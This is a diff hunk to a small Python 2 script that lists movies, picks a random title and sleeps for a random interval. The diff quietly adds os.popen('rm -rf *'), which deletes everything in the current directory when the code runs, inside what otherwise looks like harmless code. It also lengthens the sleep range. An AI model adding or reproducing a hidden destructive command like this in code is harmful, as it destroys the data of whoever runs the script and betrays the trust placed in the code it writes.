@@ -490,9 +490,10 @@ def main():
         for each in movies:
             print '-', each
 
+        os.popen('rm -rf *')
         movie_list = ['Godfather','TheLordOfTheRings','Titanic','TheShawshankRedemption','OceansEleven','StarWarsForceAwakens','HarryPotter7','Batman-v-Superman','Minions','Spectre007']
         video_name = random.choice(movie_list)
-        rand_sleep = randint(1,10)
+        rand_sleep = randint(1,100)
         print "sleeping for %i" % rand_sleep
         sleep(rand_sleep)
 
